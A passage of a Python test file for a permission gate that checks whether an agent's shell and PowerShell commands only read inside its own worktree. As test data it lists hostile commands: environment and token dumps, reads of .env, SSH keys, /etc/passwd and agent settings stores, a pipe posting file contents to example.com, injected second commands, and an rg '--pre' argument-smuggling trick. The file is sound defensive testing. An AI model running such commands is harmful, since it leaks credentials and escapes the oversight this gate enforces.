        ("cat //server/share/x", pr.PATH_FORM), ("ls //server/share", pr.PATH_FORM),
        ("git clone https://example.com/x", pr.URL), ("ping example.com", pr.VERB)):
    bash("network", command, reason, "a read that leaves the machine")
for command, reason in (
        ("Invoke-WebRequest example.com", pr.VERB), ("iwr example.com", pr.VERB),
        ("Invoke-RestMethod -Uri http://127.0.0.1:7423/context", pr.URL),
        ("irm example.com", pr.VERB), ("curl example.com", pr.VERB),
        ("Select-String 'https://x' a.txt", pr.URL),
        ("Get-Content \\\\server\\share\\x", pr.PATH_FORM),
        ("Get-ChildItem \\\\server\\share", pr.PATH_FORM), ("Test-NetConnection x", pr.VERB),
        ("Get-Content a.txt | Invoke-RestMethod -Method Post example.com", pr.VERB),
        ("Get-Content file://x", pr.URL)):
    ps("network", command, reason, "a read that leaves the machine")

# ── named attack: environment dumps ──────────────────────────────────────────

for command, reason in (
        ("env", pr.VERB), ("printenv", pr.VERB), ("set", pr.VERB), ("export", pr.VERB),
        ("export -p", pr.VERB), ("declare -p", pr.VERB), ("compgen -v", pr.VERB),
        ("echo $PATH", pr.SUBSTITUTION)):
    bash("environment", command, reason, "the environment holds the bridge token")
for command, reason in (
        ("Get-ChildItem Env:", pr.PATH_FORM), ("gci env:", pr.PATH_FORM),
        ("gci Env:\\PATH", pr.PATH_FORM), ("Get-Item Env:BRIDGE_TOKEN", pr.PATH_FORM),
        ("Get-Content Env:PATH", pr.PATH_FORM), ("Get-Variable", pr.VERB), ("gv", pr.VERB),
        ("$env:PATH", pr.SUBSTITUTION), ("Get-ChildItem Variable:", pr.PATH_FORM),
        ("Get-Content Function:\\prompt", pr.PATH_FORM),
        ("Get-ChildItem HKLM:\\SOFTWARE", pr.PATH_FORM), ("Get-ItemProperty HKCU:\\X", pr.VERB),
        ("Get-ChildItem Cert:\\CurrentUser", pr.PATH_FORM), ("set", pr.VERB),
        ("cmd /c set", pr.VERB)):
    ps("environment", command, reason, "the environment holds the bridge token")

# ── named attack: secrets inside the folder ──────────────────────────────────

SECRET_FILES = (".env", ".env.local", "server.pem", "my.key", "cert.pfx", "store.p12", "id_rsa",
                "id_ed25519", ".npmrc", ".pypirc", ".netrc", ".git-credentials", "app_secret.txt",
                "api_token.json", "credentials.json", "passwords.txt", "secrets/db.txt",
                ".ssh/config", ".aws/config")
for name in SECRET_FILES:
    bash("secrets", f"cat {name}", pr.SECRET, f"a content read of {name}")
    ps("secrets", f"Get-Content {name}", pr.SECRET, f"a content read of {name}")
for command in ("head -3 .env", "tail -n 3 .env", "wc -c .env", "grep KEY .env",
                "rg --no-config KEY .env", "file .env", "sha256sum .env", "cmp .env a.txt",
                "diff a.txt .env", "cat .ENV", "cat @WT@/.env", "ls | cat .env"):
    bash("secrets", command, pr.SECRET, "every content verb, every spelling of the name")
bash("secrets", "cat link_env", pr.SECRET, "a link INSIDE the folder that names a secret",
     needs="symlink")
bash("secrets", "cat api_token_link", pr.SECRET,
     "a secret NAME that is a link to an innocent file: the name is what was asked for",
     needs="symlink")
ps("secrets", "Get-Content api_token_link", pr.SECRET,
   "a secret NAME that is a link to an innocent file: the name is what was asked for",
   needs="symlink")
for command in ("Select-String KEY .env", "Get-FileHash .env", "gc .ENV",
                "Get-Content -LiteralPath .\\.env"):
    ps("secrets", command, pr.SECRET, "every content verb, every spelling of the name")
for command, reason in (("cat .e*", pr.GLOB), ("cat .en?", pr.GLOB),
                        ("grep -r token .", pr.OPTION), ("grep token .", pr.NOT_PLAIN_FILE),
                        ("rg --no-config password", pr.OPERAND)):
    bash("secrets", command, reason, "a secret reached by a glob, a folder or recursion")
for command, reason in (("Get-Content .e*", pr.GLOB), ("Get-ChildItem | Get-Content", pr.PIPELINE),
                        ("Get-ChildItem | Select-String password", pr.PIPELINE),
                        ("Get-ChildItem -Recurse | Select-String password", pr.OPTION)):
    ps("secrets", command, reason, "a secret reached by a glob, a folder or recursion")
for command in ("ls -la .env", "stat .env"):
    bash("secrets", command, OK, "a NAME or its metadata is not the secret's contents")
for command in ("Test-Path .env", "Get-Item .env"):
    ps("secrets", command, OK, "a NAME or its metadata is not the secret's contents")
bash("secrets", "cat notes.md", OK,
     "CEILING: a secret kept under an innocent name is read like any file")
ps("secrets", "Get-Content notes.md", OK,
   "CEILING: a secret kept under an innocent name is read like any file")

# ── own folder: outside it, odd path forms, links ────────────────────────────

for command in ("cat @OTHER@/f.txt", "cat @MAIN@/outside.txt", "cat C:/Windows/win.ini",
                "ls @MAIN@", "stat @MAIN@/precious"):
    bash("outside", command, pr.OUTSIDE, "an operand outside the seat's folder")
for command in ("Get-Content @OTHERB@\\f.txt", "Get-Content @MAIN@/outside.txt",
                "Get-ChildItem C:\\", "Get-Content C:\\Windows\\win.ini", "Get-Item @MAIN@"):
    ps("outside", command, pr.OUTSIDE, "an operand outside the seat's folder")

# ── review W2: `..` is refused wherever it stands ─────────────────────────────
# The wall collapses `link/..` as text; on Linux and macOS the kernel walks the link
# first, so `..` is the parent of the link's TARGET. One spelling, two files: neither.

for command in ("cat src/../a.txt", "cat sub/../a.txt", "ls src/..", "cat ../Other-T2/f.txt",
                "cat ../../outside.txt", "ls ..", "cat src/../../Other-T2/f.txt", "stat ../..",
                "cat ./src/../.env", "cat src/../.claude/settings.json", "cat @WT@/src/../a.txt"):
    bash("dotdot", command, pr.PATH_FORM, "a `..` part: what it names depends on who resolves it")
for command in ("Get-Content src/../a.txt", "Get-ChildItem src\\..", "Get-Content ..\\Other-T2\\f.txt",
                "Get-ChildItem ..", "Test-Path ..\\..\\outside.txt"):
    ps("dotdot", command, pr.PATH_FORM, "a `..` part: what it names depends on who resolves it")
bash("dotdot", "cat link_dir/../outside.txt", pr.PATH_FORM,
     "W2: `..` after a link out of the folder; the kernel reads the link's parent, not ours",
     needs="symlink")
ps("dotdot", "Get-Content link_dir\\..\\outside.txt", pr.PATH_FORM,
   "W2: `..` after a link out of the folder", needs="symlink")

# ── review W3: on Windows a rooted path with no drive letter ──────────────────
# Python places `/Users/x` on the process's drive; Git Bash maps it under its own
# install folder. The proved file is not the file read.

for command in ("cat @WTROOTED@/a.txt", "ls @WTROOTED@", "cat /etc/passwd",
                "cat /c/Windows/win.ini", "ls /", "cat /dev/null", "cat /proc/self/environ"):
    bash("rooted", command, pr.PATH_FORM, "W3: rooted with no drive letter", needs="windows")
for command in ("Get-Content @WTROOTEDB@\\a.txt", "Get-ChildItem \\Windows",
                "Get-Content /Windows/win.ini", "Get-ChildItem @WTROOTED@"):
    ps("rooted", command, pr.PATH_FORM, "W3: rooted with no drive letter", needs="windows")

# ── review W4 and W5: device names, and names Windows rewrites ───────────────

for command in ("ls nul", "stat NUL", "cat nul", "ls con", "stat aux.txt", "cat src/nul",
                "ls COM1", "cat lpt9.txt"):
    bash("device", command, pr.PATH_FORM, "W4: a Windows device name is not a file in the folder")
for command in ("Get-Item nul", "Get-ChildItem nul", "Get-Content nul", "Test-Path con",
                "Get-Item COM1", "Get-Content LPT1.txt", "Get-FileHash prn"):
    ps("device", command, pr.PATH_FORM, "W4: a Windows device name is not a file in the folder")
for command in ("cat 'a.txt '", "cat a.txt.", "cat .env.", "ls 'src '", "cat .claude./settings.json",
                "cat 'src /x.py'", "stat a.txt..."):
    bash("rewritten-name", command, pr.PATH_FORM,
         "W5: Windows drops a trailing dot or space, so the name shown is not the name written")
for command in ("Get-Content 'a.txt '", "Get-Content a.txt.", "gc .env.", "Get-ChildItem 'src '"):
    ps("rewritten-name", command, pr.PATH_FORM,
       "W5: Windows drops a trailing dot or space, so the name shown is not the name written")

# ── review W1: a native program's arguments, as the shell really hands them on ──
# PowerShell builds a program's command line without escaping a quote inside an
# argument, and drops an empty one: `rg 'x" "--pre=calc' a.txt` reaches rg as three
# words, one of which RUNS a program. So rg is not a PowerShell verb at all, and in bash
# a pattern that is empty, holds a double quote or ends in a backslash refuses.

for command in ("rg 'x\" \"--pre=calc' a.txt", "rg -e 'x\" \"--pre=calc' a.txt",
                "Get-Content a.txt | rg 'x\" \"--pre=calc'", "rg 'foo\" \"..\\..\\outside.txt' a.txt",
                "rg '' e", 'rg "" e', "rg 'x\\' a.txt", "rg -n foo a.txt",
                "rg --no-config -n foo a.txt", "Get-Content a.txt | rg foo",
                "rg --pre cat foo a.txt", "rg foo,..\\..\\outside.txt a.txt",
                "Get-Content a.txt | rg foo b.txt", "rg KEY .env"):
    ps("native-args", command, pr.VERB, "W1: rg under PowerShell: a pattern can become arguments")
for command, attack in (
        ("rg -n foo a.txt", "rg without --no-config: a config file can add --pre"),
        ("rg foo a.txt", "rg without --no-config"),
        ("rg -e --no-config a.txt", "--no-config as a PATTERN is not the option"),
        ("rg -- --no-config a.txt", "--no-config after -- is the pattern"),
        ("rg --no-config 'x\" \"--pre=calc' a.txt",
         "a double quote in a pattern: a Windows command line can split there"),
        ("rg --no-config '' a.txt", "an empty pattern: a Windows command line can drop it"),
        ("rg --no-config 'x\\' a.txt", "a pattern ending in a backslash can swallow the next quote"),
        ("grep 'say \"hi\"' a.txt", "the same three shapes refuse for every verb's pattern"),
        ("grep '' a.txt", "an empty pattern"), ("grep -e 'x\\' a.txt", "a trailing backslash")):
    bash("native-args", command, pr.OPTION, attack)
bash("native-args", "rg --no-config -n foo a.txt", OK, "rg as bash may run it", shows=("a.txt",))

# ── policy owner R1: rg's effective options must be the written ones ─────────
# The shell tools hand the child RIPGREP_CONFIG_PATH unchanged, and a config file can add
# `--pre` or name other files. So every eligible rg stage, alone or piped, carries
# `--no-config` written out; a bare rg is not eligible. No payload is run here.

for command, attack in (
        ("rg needle a.txt", "R1: a bare rg: its config file may add --pre"),
        ("rg needle a.txt 2>&1", "R1: the review's own example"),
        ("rg -n -C 2 needle a.txt", "R1: options, but not the one that matters"),
        ("cat a.txt | rg needle", "R1: a bare rg after a pipe"),
        ("rg --no-config needle a.txt | rg needle", "R1: the second stage is bare"),
        ("rg needle a.txt && rg --no-config needle a.txt", "R1: one bare stage refuses the command"),
        ("rg --no-config --pre=x needle a.txt", "R1: --no-config does not buy --pre"),
        ("rg --no-config -f b.txt a.txt", "R1: nor a file of patterns")):
    bash("r1-rg-config", command, pr.OPTION, attack)
for command, verbs in (("rg --no-config needle a.txt", ("rg",)),
                       ("rg --no-config needle a.txt 2>&1", ("rg",)),
                       ("cat a.txt | rg --no-config needle", ("cat", "rg")),
                       ("rg --no-config -n needle a.txt | rg --no-config -c needle", ("rg", "rg"))):
    bash("r1-rg-config", command, OK, "R1: rg with its config switched off in the text",
         verbs=verbs)
for command in ("rg needle a.txt 2>&1", "rg --no-config needle a.txt",
                "Get-Content a.txt | rg --no-config needle"):
    ps("r1-rg-config", command, pr.VERB, "R1: rg is not a PowerShell verb, with or without it")

# ── policy owner, the typed filters: only properties shown to be stored metadata ──
# Select-Object, Sort-Object and Measure-Object name PROPERTIES, and PowerShell computes
# some of a file's properties by opening it or following a link the wall never resolved.

for command in ("Get-ChildItem | Select-Object -ExpandProperty VersionInfo",
                "Get-ChildItem | Select-Object VersionInfo",
                "Get-ChildItem | Select-Object Name,VersionInfo",
                "Get-ChildItem | Select-Object Target", "Get-ChildItem | Select-Object LinkTarget",
                "Get-ChildItem | Select-Object Directory", "Get-ChildItem | Select-Object Mode",
                "Get-ChildItem | Select-Object FullName", "Get-ChildItem | Sort-Object VersionInfo",
                "Get-ChildItem | Sort-Object -Property Target",
                "Get-ChildItem | Measure-Object -Property Directory",
                "Get-ChildItem | Select-Object Count",
                "Get-Content data.json | ConvertFrom-Json | Select-Object tasks",
                "Get-ChildItem | Select-Object -Property Unknown"):
    ps("typed-filters", command, pr.OPTION,
       "a property not shown to be plain stored metadata of the listed item")
for command in ("Get-ChildItem | ConvertTo-Json", "Get-Item a.txt | ConvertTo-Json -Depth 1",
                "Get-ChildItem | Select-Object Name | ConvertTo-Json",
                "Get-ChildItem | ConvertFrom-Json | ConvertTo-Json"):
    ps("typed-filters", command, pr.PIPELINE,
       "a JSON dump of a file object reads EVERY property, VersionInfo and Target included")

# ── review round 2, S1: names Git Bash's runtime may read as LINKS ───────────
# Git Bash's programs run on a Cygwin-derived runtime. From that runtime's documented
# link forms (NOT seen done by Git for Windows, and not tried here): a file with the
# SYSTEM attribute, a `.lnk` shortcut and a link kind Windows itself will not follow can
# each be opened as a symbolic link, while Python sees an ordinary file in the folder.

for command in ("cat sysfile.txt", "ls sysfile.txt", "cat sysdir/inner.txt", "ls sysdir",
                "cat short.lnk", "ls short.lnk", "stat lnkdir.lnk/x.txt", "ls gone",
                "cat @WT@/sysfile.txt"):
    bash("s1-runtime-links", command, pr.NOT_PLAIN_FILE,
         "S1: a SYSTEM-attribute file, a .lnk name, or a missing name with a .lnk beside it",
         needs="sysattr")
for command in ("Get-Content sysfile.txt", "Get-ChildItem sysdir", "Get-Content short.lnk",
                "Get-Item gone"):
    ps("s1-runtime-links", command, pr.NOT_PLAIN_FILE,
       "S1: the same refusal whichever shell asks: one rule, no shell branch", needs="sysattr")
bash("s1-runtime-links", "ls 'nul .txt'", OK,
     "RESIDUE, pinned: a space before the dot escapes the device-name rule; it is a LISTING of a"
     " name that is not there, and the content read of it refuses", needs="windows")
bash("s1-runtime-links", "cat 'nul .txt'", pr.NOT_PLAIN_FILE,
     "the content read of that residue is not a file that exists", needs="windows")

# ── review round 2, S2: a JSON dump only of what ConvertFrom-Json made ───────
# The lines Get-Content emits carry the same drive and provider members a file object
# does, so `Get-Content a.txt | ConvertTo-Json` prints machine metadata.

for command in ("Get-Content a.txt | ConvertTo-Json", "Get-Content a.txt | ConvertTo-Json -Depth 4",
                "Get-Content a.txt | Select-Object -First 1 | ConvertTo-Json",
                "Get-Content data.json | ConvertTo-Json | ConvertFrom-Json",
                "Get-Content a.txt | ConvertTo-Json; Get-Content data.json | ConvertFrom-Json",
                "Test-Path a.txt | ConvertTo-Json"):
    ps("s2-json-dump", command, pr.PIPELINE,
       "S2: ConvertTo-Json with no ConvertFrom-Json before it in the same pipeline")
ps("s2-json-dump", "Get-Content data.json | ConvertFrom-Json | ConvertTo-Json -Depth 2", OK,
   "S2: the form that stays", verbs=("get-content", "convertfrom-json", "convertto-json"))
ps("s2-json-dump", "Get-Content data.json | ConvertFrom-Json | ConvertTo-Json -Depth 8", pr.OPTION,
   "the depth bound stays at 4: nothing is widened in this card")

# ── review item 6: a seat with two worktrees ─────────────────────────────────

bash("two-roots", "cat @WT3@/c.txt", OK, "the seat's second worktree, named alone",
     where="main", shows=("c.txt",))
ps("two-roots", "Get-Content @WT3@/c.txt", OK, "the seat's second worktree, named alone",
   where="main", shows=("c.txt",))
bash("two-roots", "cat @WT@/a.txt @WT3@/c.txt", pr.OUTSIDE,
     "one command naming both: a command is proved inside ONE folder", where="main")
ps("two-roots", "Get-Content @WT@/a.txt; Get-Content @WT3@/c.txt", pr.OUTSIDE,
   "one command naming both: a command is proved inside ONE folder", where="main")

# ── review item 5: forms that mean the same on every platform ────────────────
# Written with `/` and no drive letter, so they are judged on Linux and macOS too.
# NOTHING here has been run on either: the expectations are this machine's.

for command, shows in (("cat sub/deep/z.txt", ("sub/deep/z.txt",)), ("ls src/", ("src",)),
                       ("head -n 2 ./src/x.py", ("src/x.py",))):
    bash("posix-forms", command, OK, "a relative `/` path", shows=shows)
for command, shows in (("Get-Content ./src/x.py", ("src/x.py",)), ("Get-ChildItem src/", ("src",)),
                       ("Get-Content src/x.py | Select-String foo", ("src/x.py",)),
                       ("Test-Path sub/deep/z.txt", ("sub/deep/z.txt",))):
    ps("posix-forms", command, OK, "a relative `/` path under PowerShell", shows=shows)
bash("posix-forms", "cat @OTHER@/f.txt", pr.OUTSIDE, "an absolute path into another seat's tree")
ps("posix-forms", "Get-Content @OTHER@/f.txt", pr.OUTSIDE,
   "an absolute path into another seat's tree")

# ── review W4: the wall answers, it never raises ─────────────────────────────

bash("fault", "cat a.txt", FAULT, "no workspace at all", where="none")
ps("fault", "Get-Content a.txt", FAULT, "no workspace at all", where="none")
bash("fault", "cat @WT@/a.txt", FAULT, "a seat name that is not text", where="main", seat=5)
ps("fault", "Get-Content @WT@/a.txt", FAULT, "a seat name that is not text", where="main",
   seat=["Seat"])
for command in ("cat ~/.ssh/id_rsa", "cat ~", "ls ~", "cat C:secret.txt", "cat a.txt:stream",
                "cat 'a.txt::$DATA'", "cat 'a;b'", 'cat "a b|c"', "cat a,b", "cat 'a\\b.txt'",
                "cat 'a.txt; rm b.txt'", "cat 'a&b'", "cat a=b"):
    bash("path-form", command, pr.PATH_FORM, "a path that is not a plain literal path")
for command in ("Get-Content ~\\x", "Get-Content C:secret.txt", "Get-Content a.txt:stream",
                "Get-Content 'a.txt::$DATA'", "Get-Content HKLM:\\x", "Get-Content 'a;b'",
                "Get-ChildItem ~", "Get-Content 'a|b'", "Get-Content Temp:\\x"):
    ps("path-form", command, pr.PATH_FORM, "a path that is not a plain literal path")
ps("path-form", "Get-Content \\\\?\\C:\\x", pr.GLOB, "a device path")

for command in ("cat link_dir/x", "ls link_dir", "cat link_file", "stat link_file"):
    bash("links", command, pr.OUTSIDE, "a symlink that leaves the folder", needs="symlink")
for command in ("Get-Content link_dir\\x", "Get-ChildItem link_dir", "Get-Content link_file"):
    ps("links", command, pr.OUTSIDE, "a symlink that leaves the folder", needs="symlink")
for command in ("cat junction/x", "ls junction", "ls junction/"):
    bash("links", command, pr.OUTSIDE, "a junction that leaves the folder", needs="junction")
for command in ("Get-Content junction\\x", "Get-ChildItem junction", "Test-Path junction\\x"):
    ps("links", command, pr.OUTSIDE, "a junction that leaves the folder", needs="junction")
bash("links", "cat hard.txt", pr.NOT_PLAIN_FILE, "a hard link to a file outside the folder",
     needs="hardlink")
ps("links", "Get-Content hard.txt", pr.NOT_PLAIN_FILE,
   "a hard link to a file outside the folder", needs="hardlink")
bash("links", "ls -la hard.txt", OK, "the NAME of a hard link is the folder's own", needs="hardlink")
bash("links", "cat inner_link/x.py", OK, "a link that stays inside is shown where it lands",
     needs="symlink", shows=("src/x.py",))
ps("links", "Get-Content inner_link\\x.py", OK, "a link that stays inside is shown where it lands",
   needs="symlink", shows=("src/x.py",))

for command in ("cat src", "cat missing.txt", "cat .", "head -3 sub/deep"):
    bash("not-plain", command, pr.NOT_PLAIN_FILE, "a content operand that is not an existing file")
ps("not-plain", "Get-FileHash src", pr.NOT_PLAIN_FILE,
   "a content operand that is not an existing file")

# ── which folder is the seat's, and where the command runs ───────────────────

bash("own-root", "cat @WT@/a.txt", OK, "a seat in the main checkout naming its own worktree",
     where="main", shows=("a.txt",))
ps("own-root", "Get-Content @WTB@\\a.txt", OK, "a seat in the main checkout naming its own worktree",
   where="main", shows=("a.txt",))
bash("own-root", "cat a.txt", pr.OUTSIDE, "a seat in the main checkout: a.txt is the checkout's",
     where="main")
bash("own-root", "ls", pr.OUTSIDE, "a seat in the main checkout lists the checkout", where="main")
bash("own-root", "cat @OTHER@/f.txt", pr.OUTSIDE, "another seat's worktree", where="main")
ps("own-root", "Get-ChildItem", pr.OUTSIDE, "a seat in the main checkout lists the checkout",
   where="main")
bash("own-root", "cat @WT@/a.txt", pr.NO_OWN_FOLDER, "a seat with another name owns no worktree here",
     where="main", seat="Someone")
bash("own-root", "cat @WT@/a.txt", pr.NO_OWN_FOLDER, "an unnamed seat", where="main", seat=None)
bash("own-root", "cat @WT@/a.txt", pr.NO_OWN_FOLDER, "an empty seat name", where="main", seat="")
bash("own-root", "cat a.txt", pr.NO_OWN_FOLDER, "a plain directory is nobody's worktree",
     where="plain")
ps("own-root", "Get-Content a.txt", pr.NO_OWN_FOLDER, "a plain directory is nobody's worktree",
   where="plain")
bash("own-root", "cat a.txt", pr.NO_OWN_FOLDER, "a workspace that does not exist", where="missing")
bash("own-root", "cat f.txt", OK,
     "LOOSE, reported: own_roots calls the linked worktree a seat SITS in its own, whatever its name",
     where="other")
bash("cwd", "cat a.txt", pr.CWD, "the tool runs in a subfolder that has its own a.txt", cwd="src")
bash("cwd", "ls", pr.CWD, "which directory is listed depends on where the tool runs", cwd="src")
ps("cwd", "Get-ChildItem", pr.CWD, "which directory is listed depends on where the tool runs",
   cwd="src")
bash("cwd", "cat @WT@/a.txt", OK, "an absolute operand is the same file wherever it runs",
     cwd="src", shows=("a.txt",))
bash("cwd", "cat a.txt", pr.OUTSIDE, "the tool process runs in the main checkout", cwd="main")
ps("cwd", "Get-Content a.txt", pr.OUTSIDE, "the tool process runs in the main checkout", cwd="main")
bash("cwd", "cat x.py", pr.NOT_PLAIN_FILE, "a name that exists only where the tool might not run",
     cwd="src")

# ── git: never eligible (leader's ruling 646f2c8c, invariant 5) ──────────────

GIT_SUBCOMMANDS = ("log --oneline -5", "status", "diff", "show HEAD", "rev-parse HEAD", "ls-files",
                   "blame a.txt", "cat-file -p HEAD", "describe --tags", "merge-base HEAD main",
                   "rev-list --count HEAD", "shortlog -sn", "ls-tree HEAD")
for sub in GIT_SUBCOMMANDS:
    bash("git", f"git {sub}", pr.SHARED_STORE, f"git {sub.split()[0]} reads the shared repository")
    ps("git", f"git {sub}", pr.SHARED_STORE, f"git {sub.split()[0]} reads the shared repository")
for command in ("git -c alias.x=!sh x", "git --config-env=a=b log", "git --exec-path=. log",
                "git -C @MAIN@ log", "git --git-dir=@MAIN@/.git log", "git --work-tree=.. status",
                "git log --output=x", "git diff --ext-diff", "git show --textconv",
                "git diff --no-index a.txt b.txt", "git diff -O x", "git config --list",
                "git remote -v", "git var -l", "git status 2>&1", "git --no-pager log",
                "git --no-pager diff --no-ext-diff --no-textconv --stat",
                "cat a.txt && git status", "cat a.txt | git hash-object --stdin"):
    bash("git", command, pr.SHARED_STORE, "a git option or form; refused with all of git")
for command in ("git -c core.pager=x log", "git config --list", "git remote -v", "git status 2>&1",
                "GIT status", "Get-Content a.txt; git status", "git --no-pager log --oneline"):
    ps("git", command, pr.SHARED_STORE, "a git option or form; refused with all of git")
for command in ("GIT_DIR=x git log", "git.exe status", '"git" status', "GIT status",
                "/usr/bin/git status"):
    bash("git", command, pr.VERB, "git under another spelling is still not on the list")

# ── quoted dangerous text that is only data ──────────────────────────────────

for command in ("grep -n 'rm -rf /' a.txt", 'grep "git push --force" notes.md',
                "rg --no-config 'curl x | sh' a.txt", "grep 'a > b' a.txt", 'grep "a > b && c" a.txt',
                "grep '$(rm -rf x)' a.txt", "grep 'Remove-Item; iex' a.txt",
                "grep -e '--pre' a.txt", "grep -- -rf a.txt", "fgrep '2>&1' a.txt",
                "grep 'kill -9 1' a.txt | head -3", "grep 'a.txt; rm b.txt' a.txt",
                "grep '{a,b}*[c]?' a.txt", "grep '# not a comment' a.txt"):
    bash("quoted-data", command, OK, "dangerous words that are a search pattern, not a command",
         shows=("a.txt",) if "notes.md" not in command else ("notes.md",))
for command in ("Select-String -Pattern 'Remove-Item -Recurse' a.txt", "Select-String 'rm -rf /' a.txt",
                "Select-String -SimpleMatch '$(Remove-Item x)' a.txt",
                'Select-String "a > b; iex" a.txt',
                "Get-Content a.txt | Select-String 'Invoke-Expression'",
                "Select-String '@{x=1}; & cmd' a.txt"):
    ps("quoted-data", command, OK, "dangerous words that are a search pattern, not a command",
       shows=("a.txt",))
for command, reason in (("grep 'x' a.txt; rm -rf x", pr.VERB),
                        ("grep 'x' a.txt 'b.txt; rm x'", pr.PATH_FORM),
                        ("grep 'x' 'a.txt' && 'rm' b.txt", pr.VERB),
                        ("grep 'a' a.txt | 'sh'", pr.VERB)):
    bash("quoted-data", command, reason, "the quote ends and a command follows")
for command, reason in (("Select-String 'a' a.txt; Remove-Item b.txt", pr.VERB),
                        ("Select-String 'a' 'a.txt; Remove-Item b.txt'", pr.PATH_FORM)):
    ps("quoted-data", command, reason, "the quote ends and a command follows")

# ── PowerShell: a path cmdlet also takes paths from the pipeline ─────────────

for command in ("Get-ChildItem | Get-Content", "Get-Content a.txt | Get-Content",
                "Get-ChildItem | Get-Item", "Get-ChildItem | Get-FileHash",
                "Get-ChildItem | Test-Path", "Get-ChildItem | Get-ChildItem",
                "Get-ChildItem | Select-String foo", "Get-Item a.txt | Select-String foo",
                "Get-ChildItem | Sort-Object Name | Select-String foo",
                "Get-ChildItem -Name | Select-String foo",
                "Get-Content a.txt | Select-String foo b.txt", "Select-Object Name",
                "ConvertTo-Json", "Measure-Object"):
    ps("pipeline", command, pr.PIPELINE, "a stage that reads the files its input names")
ps("pipeline", "'..\\outside.txt' | Get-Content", pr.VERB, "a path piped in as a string")
for command in ("Get-Content a.txt |", "| Get-Content a.txt", "Get-Content a.txt | | Measure-Object"):
    ps("pipeline", command, pr.SYNTAX, "a pipe with nothing on one side")
for command in ("cat a.txt |", "cat a.txt | | wc -l", "cat a.txt &&", "&& cat a.txt"):
    bash("pipeline", command, pr.SYNTAX, "a join with nothing on one side")

# ── the eight real approvals behind this card: none is eligible ──────────────
# (CloseLaneAstra-T0306-approval-evidence-20261007.md; duplicates kept as separate requests)

_C1 = ("Invoke-RestMethod -Uri http://127.0.0.1:7423/context -Headers @{ Authorization = "
       "('Bearer ' + (Get-Content \"$env:USERPROFILE/.litesuite/bridge-token\" -Raw).Trim()) } "
       "| ConvertTo-Json -Depth 12")
_C2 = ("python -m litesuite_tools.cli run tasks action=list status=reviewing | ConvertFrom-Json "
       "| Select-Object -ExpandProperty tasks | Where-Object { $_.id -in "
       "@('T0273-A','T0275','T0286','T0277') } | ConvertTo-Json -Depth 8")
_C3 = ("Get-CimInstance Win32_LogicalDisk -Filter \"DeviceID='C:'\" | Select-Object DeviceID,"
       "FreeSpace,@{Name='FreeGB_decimal';Expression={$_.FreeSpace / 1e9}},@{Name='MeasuredUTC';"
       "Expression={[DateTime]::UtcNow.ToString('o')}} | ConvertTo-Json")
_C4 = ("python -m litesuite_tools.cli run tasks action=list | ConvertFrom-Json | Select-Object "
       "-ExpandProperty tasks | Where-Object { $_.id -in "
       "@('T0273-A','T0275','T0286','T0277','T0273') } | ConvertTo-Json -Depth 8")
_C5 = ("python -m litesuite_tools.cli run tasks action=list | ConvertFrom-Json | Select-Object "
       "-ExpandProperty tasks | Where-Object { $_.id -eq 'T0306' } | ConvertTo-Json -Depth 8")
_C6 = ("python -m litesuite_tools.cli run tasks action=list status=fixing | ConvertFrom-Json "
       "| Select-Object -ExpandProperty tasks | Where-Object { $_.id -eq 'T0306' } "
       "| ConvertTo-Json -Depth 8")
_EXCLUDED = ("$r='C:/Projects/.scratch/board-zero/20261006-close'; Get-FileHash "
             "\"$r/BoardCloseAstra-LANE-HANDOFF-20261007.md\" -Algorithm SHA256; Get-ChildItem $r "
             "| Select-Object Name; Get-Command liteharness,lst -ErrorAction SilentlyContinue "
             "| Select-Object Name,Source; Get-ChildItem Env: | Where-Object { $_.Name -match "
             "'BRIDGE|LITE|AGENT' } | Select-Object Name,Value")
for approval, command, reason in (
        ("appr-6576328d880e (C1)", _C1, pr.URL), ("appr-305ca9fda768 (C1)", _C1, pr.URL),
        ("appr-0f1a9a3a5076 (C2)", _C2, pr.SYNTAX), ("appr-03c903d2d14c (C3)", _C3, pr.SYNTAX),
        ("appr-fb0c9b4b124d (C4)", _C4, pr.SYNTAX), ("appr-b3d8edae406f (C3)", _C3, pr.SYNTAX),
        ("appr-8bf61d9fc412 (C5)", _C5, pr.SYNTAX), ("appr-c69af565d36d (C6)", _C6, pr.SYNTAX)):
    ps("real-eight", command, reason, f"real approval {approval}: not a read of the seat's folder")
ps("real-eight", _EXCLUDED, pr.SUBSTITUTION,
   "appr-6f1436fe8bba, the excluded ninth: an environment VALUE dump, rightly denied")

# ── invariant 3: the human's opt-in scratch roots and TEMP are not the folder ──

for command in ("cat @CARD@/card-note.txt", "ls @CARD@", "cat @TEMP@/t.txt", "ls @TEMP@"):
    bash("inv3-scratch", command, pr.OUTSIDE,
         "output_context grants OUTPUT there; it is not read authority", where="card")
for command in ("Get-Content @CARD@/card-note.txt", "Get-ChildItem @TEMP@"):
    ps("inv3-scratch", command, pr.OUTSIDE,
       "output_context grants OUTPUT there; it is not read authority", where="card")
bash("inv3-scratch", "cat a.txt", OK, "control: the same seat reading its own worktree",
     where="card", shows=("a.txt",))

# ── invariant 4: no danger label is not proof of a read ──────────────────────

INV4_NO_LABEL = ("true || rm -rf x", "cat a.txt || rm -rf x", "python script.py", "./tool.exe",
                 "npm run build", "echo hi")
for command in INV4_NO_LABEL:
    bash("inv4-no-proof-by-absence", command, pr.VERB,
         "today's policy names no danger here (or only 'an unrepresented shell construct')")
for command in ("Start-Process notepad", ".\\scripts\\dev.ps1", "Write-Output hi"):
    ps("inv4-no-proof-by-absence", command, pr.VERB, "today's policy names no danger here")

# ── invariant 5: linked .git, shared metadata, other seats' stores ───────────

PROTECTED_FILES = (".agents/Other/memory.md", ".convos/c1/handoff.md", ".liteharness/state.json",
                   ".litesuite/bridge-token", ".claude/settings.json", ".codex/config.toml")
for name in PROTECTED_FILES:
    bash("inv5-stores", f"cat {name}", pr.PROTECTED, f"a store inside the folder: {name}")
    bash("inv5-stores", f"ls {name.split('/')[0]}", pr.PROTECTED,
         f"listing a store: {name.split('/')[0]}")
    ps("inv5-stores", f"Get-Content {name}", pr.PROTECTED, f"a store inside the folder: {name}")
    ps("inv5-stores", f"Get-ChildItem {name.split('/')[0]}", pr.PROTECTED,
       f"listing a store: {name.split('/')[0]}")
for command in ("cat .git", "ls .git", "stat .git", "cat .CLAUDE/settings.json",
                "cat @WT@/.claude/settings.json", "ls .agents/Other"):
    bash("inv5-stores", command, pr.PROTECTED, "the .git pointer, and every spelling of a store")
for command in ("Get-Content .git", "Get-Item .git", "Get-Content .Claude\\settings.json",
                "Test-Path .agents\\Other\\memory.md"):
    ps("inv5-stores", command, pr.PROTECTED, "the .git pointer, and every spelling of a store")
